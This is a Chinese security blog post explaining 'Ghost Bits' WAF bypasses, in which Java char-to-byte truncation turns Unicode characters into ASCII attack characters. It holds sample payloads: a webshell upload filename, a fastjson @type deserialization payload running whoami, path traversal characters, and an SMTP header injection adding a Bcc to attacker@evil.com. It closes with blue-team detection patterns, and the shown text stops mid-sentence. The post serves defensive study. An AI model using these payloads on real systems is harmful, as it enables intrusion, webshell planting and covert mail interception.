---
title: hvv 2026 -  今年攻防演练的新变量：WAF 看不见，后端却执行了
url: https://mp.weixin.qq.com/s/c5GQePJVfgBZ8OVP9mPTeg
source: Doonsec's feed
date: 2026-07-09
fetch_date: 2026-07-10T05:55:18.573698
---

# hvv 2026 -  今年攻防演练的新变量：WAF 看不见，后端却执行了

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/8qOq10zFicMCl7PzEJc7gZ4Tl4SGtTN9UyPy5Vhyic9pCia8zl9QoGvd3PVp142WJe1jicFTEYblrdLhFmBBU9hSWfzz2ZeibxEpBNRoRsS67oRY/0?wx_fmt=jpeg)

# hvv 2026 - 今年攻防演练的新变量：WAF 看不见，后端却执行了

原创

MessFeel
MessFeel

MessFreeSecurity

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

今年 Black Hat Asia 上有份材料，《Cast Attack: A New Threat Posed by Ghost Bits in Java》。没刷屏，没上热搜，群里转发量也不大。

但我看完之后在笔记里写了一行：**这东西会成为今年攻防演练里红队工具箱里的常客。**

不是某个单点 RCE。没有"一键打穿全网"那种新闻标题。它是一种藏在 Java 生态底层的解析差异攻击面：同一个输入，WAF 看到的是乱码，后端执行出来的是攻击语义。

先说原理，再聊怎么打。

![](https://mmbiz.qpic.cn/mmbiz_png/8qOq10zFicMCPObJURgVKhiczpvtS6Cdvx3bNWibRpnlD5rHeCHZv5FadBxdTibgQicRmdu0MlyBYDGbJ5w4D4o7kqetjLw1ZHhibZWiaEzGibhangs/640?wx_fmt=png&from=appmsg)

*图：Black Hat Asia 2026《Cast Attack: A New Threat Posed by Ghost Bits in Java》原版议题页。*

---

## 原理：Java 的 char 是 16 位，但很多代码只认低 8 位

Java 的 `char` 类型是 16 位无符号整数，码点范围 0x0000 到 0xFFFF。但很多 Java 代码在把字符转成字节的时候，做了强转或位运算，只取低 8 位。高位直接被丢弃。

常见的危险写法：

```
(byte) ch                    // 只保留低 8 位，高位截断
ch&0xff                    // 等价操作
outputStream.write(ch)       // OutputStream.write(int) 只写低 8 位
DataOutputStream.writeBytes(String)  // 每个 char 只取低字节
```

![](https://mmbiz.qpic.cn/mmbiz_png/8qOq10zFicMAqia7zDYapM276JgFyXNmrcibzZGkNf7YPIoTLiaIOgk1QT4cwLEdI5DZytFtBA3ibp9p4uQuW5hdMkRf6QdiaosZrrVvE8bFNNsls/640?wx_fmt=png&from=appmsg)

*图：PPT 中总结的 Ghost Bits 典型触发模式，本质都是高位被丢弃、低位被保留。*

这意味着什么？任何一个 Unicode 字符，只要它的低 8 位等于某个 ASCII 字符的码点值，经过这些转换之后，就会变成那个 ASCII 字符。

举个例子。`.` 的 ASCII 码是 0x2E。Unicode 字符 `Į`（U+012E，带 ogonek 的 I）的二进制是：

```
0000 0001 0010 1110
          ^^^^^^^^
          低 8 位 = 0x2E = '.'
```

高位被截断之后，`Į` 变成了 `.`。

同理：

| Unicode 字符 | 码点 | 低 8 位 HEX | 截断后变成 | 在攻击里的意义 |
| --- | --- | --- | --- | --- |
| `Į` | U+012E | 0x2E | `.` | 路径分隔、文件扩展名 |
| `į` | U+012F | 0x2F | `/` | 路径穿越 |
| `Ġ` | U+0120 | 0x20 | 空格 | HTTP 协议分段 |
| `ħ` | U+0127 | 0x27 | `'` | SQL 注入单引号 |
| `Ŝ` | U+015C | 0x5C | `\` | Windows 路径分隔 |
| `ĥ` | U+0125 | 0x25 | `%` | URL 编码前缀 |
| `Ł` | U+0141 | 0x41 | `A` | SQL SELECT 关键字重组 |
| `č` | U+010D | 0x0D | `\r` | CRLF 注入 |
| `Ċ` | U+010A | 0x0A | `\n` | CRLF 注入 |

规律很简单：要找某个 ASCII 字符的 Ghost Bit 等价物，拿它的码点值加 0x0100，去 Unicode 表里查对应字符。码点在 U+0100 到 U+01FF 之间的拉丁扩展字符，低 8 位刚好覆盖全部 ASCII 范围（0x00 到 0xFF）。

**WAF 看到的是 `ĮįĮį`——"带帽子的字母加斜杠字母"。后端 `(byte) ch` 之后，看到的是 `../`——路径穿越。**

---

## 这不是编码绕过，是类型收窄制造的语义分叉

传统 WAF 绕过大半是字符串层面的。大小写混写、双写、注释插入、URL 编码、Unicode 编码、双重解码、分块传输。这些打法被规则库覆盖了十几年，蓝队也有肌肉记忆。

Ghost Bits 的本质不是"把 `../` 换个写法"。是**让防护设备和执行组件在同一个输入的两个不同表示之间产生分叉**。

WAF 工作在 HTTP 层。它看到的是字节流经过 URL 解码之后的字符串。它匹配规则的时候，看到的是 Unicode 字符 `ĮįĮį`。它的规则库里没有"`Į` 也是点号"这条规则。放行。

后端 Java 应用拿到这个字符串。它在某个环节调用了 `(byte) ch`、`OutputStream.write(int)`、或者某个第三方库底层做了同样的强转。字符被截断，`Į` 变成 `.`，`į` 变成 `/`。`ĮįĮį` 变成了 `../`。

此时路径穿越已经发生。但 WAF 放行的那个原始请求里，从来没出现过 `../`。

**这不是编码绕过。是攻击者在字符变成字节的那一瞬间，利用了 Java 类型系统的收窄规则。**

![](https://mmbiz.qpic.cn/mmbiz_png/8qOq10zFicMBz7VtqBelehJH66U0kLo59YHlc2vtibt8MfSr0icxbfib4Etcic1OZyxME0ichibdSbdq1b9muVR10wXux10pY9icK6zhibId1JJ9lvmg/640?wx_fmt=png&from=appmsg)

*图：原版 PPT 将这类问题归到 Traffic Spoofing / WAF Bypass，核心是边界设备和后端组件解释结果不一致。*

---

## 具体攻击面：PDF 里提到的四类场景

### 1. 文件上传绕过

Tomcat 的文件上传处理中，`DiskFileItem` 在写文件的时候，文件名经过了多层处理。Servlet 规范里的 `Part.getSubmittedFileName()` 返回的是 RFC 5987 编码解析之后的文件名。如果攻击者上传一个文件名包含 `Į`（U+012E）的 multipart 请求——

WAF 检查扩展名：`shell.ĮxĮ`。不是 `.jsp`、不是 `.jspx`、不是 `.war`。放行。

Tomcat 在某个内部路径里对文件名做了字符到字节的转换（或者应用自己用 `FileOutputStream` 写文件的时候传入了含有高位字符的文件名），`Į` 被截断为 `.`。最终落盘文件名变成 `shell.jsp`。

WAF 日志里记录的文件名：`shell.ĮxĮ`。应用服务器磁盘上的文件名：`shell.jsp`。两个不同的名字，蓝队如果不把 WAF 原始请求和磁盘文件做 HEX 级别比对，很难发现这个 webshell 是怎么写进去的。

*图：文件上传场景里，文件名在检查阶段和落盘阶段可能出现不同语义。*

### 2. Jackson 和 fastjson 的 JSON 字段变形

Jackson 的 `charToHex` 方法在序列化 JSON 的时候，会把某些 Unicode 字符转换成 `\uXXXX` 格式。但在反序列化方向，Jackson 解析 `\uXXXX` 到内部 char 表示之后，如果后续代码把这个 char 写进了字节流——比如拼接成命令、路径、SQL——截断就可能发生。

fastjson 对 Unicode 数字、`\u`、`\x` 的解析也有类似链路。攻击者可以在 JSON 字段里嵌入 Ghost Bits 变形后的字符：

```
{"@type":"com.example.Exploit","cmd":"whoami"}
```

把 `@type` 里的 `t`（0x74）替换成 `Ŵ`（U+0174）。WAF 的 JSON 注入规则在匹配 `@type` 关键字时，碰到的字符串是 `@Ŵype`——不匹配。fastjson 内部在某个字符处理环节做了低位截断，`Ŵ` 变成 `t`，`@type` 被还原，反序列化触发。

这里的关键不是 fastjson 有没有专门处理 Ghost Bits。而是 JSON 库的反序列化链路很长，从字节到字符到对象，每个转换点都可能出现这种截断。攻击者不需要控制整个链路，只需要找到其中一个点。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8qOq10zFicMA5w6LwibI7t8IbPB33RmVkyuzg51VFmUPTMGYOtbJic3icJndibDwdabmE1ia1lMX9BQ4kdib7Dahp6ZrOTibMmSM7BnWtnXuKALiaSAs/640?wx_fmt=png&from=appmsg)

*图：Jackson 案例展示的重点不是单个 payload，而是 WAF 侧字符串和 JSON 解析侧字符串发生分叉。*

### 3. 路径穿越和认证绕过

Openfire CVE-2023-32315 这个案例很典型。原漏洞本质是管理控制台的路径鉴权逻辑存在绕过。传统利用里大家都见过 `%u002e` 绕过——Unicode dot。绕过方式是把 `.` 写成 `%u002e`，让鉴权逻辑不把它当点号处理。

但 Ghost Bits 往底层又推了一层。Jetty 在处理 URL 路径时，内部 Hex 转换逻辑里，某些非标准字符经过 `(byte)` 强转后，会被折叠成有效的十六进制半字节。什么意思？一个看起来不是 `%2e` 的字符序列，经过 Jetty 内部的字节转换之后，恰好变成了 `%2e`，然后被下一阶段的 URL 解码器还原成 `.`。

鉴权层看到的是"不带点号的路径"，URL 解码后的路径里却出现了 `.`。鉴权层和路径解析层之间，差了两次转换。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8qOq10zFicMBlZ1TrkSJyl5FSMhf26u7XlzFAWwO64RDBvBlTH9CGAnj2Y4FLsRfSj678kacibepZ1Ihn3VTJBC8eRwibP7dib4d1xPw8eDUvPc/640?wx_fmt=png&from=appmsg)

*图：Openfire 案例很适合说明路径鉴权和路径规范化之间的语义错位。*

Spring CVE-2025-41242 也是同样的思路。Spring MVC 在处理静态资源时，安全检查阶段使用的路径是框架层的规范化结果。如果在安全检查之后、实际读文件之前，Servlet 容器对路径又做了一次解码或规范化——而且这次规范化里触发了 Ghost Bits 截断——那安全检查就是无效的。

蓝队需要记住的不是"某个 CVE 的利用条件"。是一种排查思路：**安全检查阶段的输入，和最终执行阶段的输入，是不是经过了不同的转换路径。**

![](https://mmbiz.qpic.cn/mmbiz_png/8qOq10zFicMDhhmegaB12ticwOQOZTs6BeAicnYVNfv6a6pCaNcbHTNzpuf7ic9xm2Sno8gpOsVSrKESPucvzRZtDHJXQRmZzcVLHrp9ZI8cLqI/640?wx_fmt=png&from=appmsg)

*图：Spring 静态资源案例里的关键点，是安全检查与最终资源解析之间存在时间差和二次解析。*

### 4. SMTP 注入和邮件头注入

CVE-2025-7962，Jakarta Mail / Angus Mail 的 SMTP 注入。底层原理是邮件库在序列化邮件头的时候，某些字段（发件人显示名、收件人地址、Reply-To）经过了字符到字节的转换。如果上层应用没有过滤高位 Unicode 字符，攻击者在注册邮箱时填入：

```
user@company.comčĊBcc: attacker@evil.com
```

`č`（U+010D）→ 低 8 位是 0x0D = `\r`。`Ċ`（U+010A）→ 低 8 位是 0x0A = `\n`。底层邮件库做了 `(byte) ch`，`čĊ` 变成 `\r\n`。SMTP 协议里，`\r\n` 是命令分隔符。`\r\nBcc:` 被 SMTP 服务器解析为新邮件头，攻击者成功插入了一个密送地址。

这封邮件的 SPF、DKIM、DMARC 全过——因为它确实是从企业官方邮件系统发出去的。收件人看到的是可信来源。蓝队如果只查外部钓鱼域名，可能从头到尾没往自家系统邮件上想。

Jira、Confluence 等上层应用底层依赖了 Jakarta Mail。如果它们的用户注册、邮件通知、邀请功能没有对邮箱地址做高位字符过滤——很多系统确实没做，因为"邮件地址校验"通常只查格式，不查 Unicode 范围——这个点就能通。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8qOq10zFicMCHKWIXWlPRxMAwGCfkHsd6RSsCP0ibcsB8VWHfR0zTy5AUqzFPGwrMZR6BsfY8s6yHSkOIgvttibQ8evbJqHNT1G2xZw8G3j47c/640?wx_fmt=png&from=appmsg)

*图：SMTP 注入的危险不只在邮件库本身，还在于它会沿着依赖链扩散到 Jira、Confluence 等业务系统。*

---

## 为什么蓝队现在就该关注，而不是等第一个案例出来

四条理由。

**Java 资产面太大。** OA、SSO、统一认证、API 网关、文件上传服务、DevOps 平台、Jira、Confluence、Jenkins、Keycloak、自研 Spring Boot——攻防演练里常见的核心目标几乎全是 Java 栈。Ghost Bits 不局限于一个框架或一个 CVE，它横跨编码层、容器层、协议层、解析库。任何一个涉及"把外部输入的字符变成字节"的位置，都可能是检查点。

**蓝队关注度不足。** 这类问题没有一个"10 分 RCE"的标题。它看起来像编码问题、像乱码、像某个库的边界条件。很多防守团队对它没有肌肉记忆——因为没人专门为"char 到 byte 的类型收窄"做过应急响应演练。没有预案，出了事之后排查方向大概率跑偏。

**它天然适合做 WAF 绕过。** WAF 规则靠特征匹配。如果有一种方法能让 WAF 看到"不匹配任何特征的 Unicode 字符"，让后端看到"完全匹配攻击特征的 ASCII 字节"，那它就是天生的绕过层。不是绕过一条规则，是绕过一类规则。而且 payload 可以任意变形——同一个 `../` 在 Ghost Bits 里有多组 Unicode 等价表示（U+012E/U+022E/U+032E 等等，低位相同即可）。

**它容易造成日志错位。** WAF 日志里是一串 `ĮįĮį`，应用日志里是解码后的 `/admin`，容器日志里是规范化后的绝对路径，文件系统上是已经不存在的敏感文件。四层日志，四种表示。如果没有保留原始 HTTP 请求体、没有做多层日志关联，分析员很难还原"这条没命中规则的请求，为什么最后穿越到了 `/etc/passwd`"。Ghost Bits 制造的请求，WAF 大概率不响，SIEM 大概率不关联，分析员大概率归类为"奇怪的乱码请求"，关闭。

---

## 蓝队现在能做的四件事

**资产排查。** 先把 Java 解析链理一遍。Spring Framework / Boot 的静态资源映射、Jetty / Undertow / Tomcat 的版本和配置、Jackson / fastjson / BCEL / Jakarta Mail / Apache HttpClient 的依赖版本。以及自研代码里涉及 URL decode、文件名处理、Header 处理、SMTP、Redis、路径拼接、字节流写入的部分。不用全量审代码，先圈范围：**哪里把外部输入从字符变成了字节，哪里就是 Ghost Bits 的检查点。**

**代码检索。** 让研发和安全一起，在代码仓库里全局搜索这几个 pattern：

```
(byte) ch
ch & 0xff
0xff & ch
OutputStream.write(int)
DataOutputStream.writeBytes
RandomAccessFile.writeBytes
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8qOq10zFicMByKvL52nPM6fWSJBviajRrRib5CZib6Chb3mBBibypkIiah2diaaLrQk8yPHfr9rJ9KZsUCicFTsKkgDoWiaIv1Dt0LKIgCAlojcTBsu0/640?wx_fmt=png&from=appmsg)

*图：原版 PPT 中的自动发现思路，正好可以转成蓝队代码检索 checklist。*

搜出来不等于有漏洞。但要逐个追一个问题：这个转换的输入，能不能被外部用户控制？如果能，转换前有没有做过字符白名单校验？转换后的字节流会不会进入路径、协议、命令、文件名、Header、SMTP 命令？

**日志检测。** 演练期间重点盯这些日志形态：URL、Query、Header、...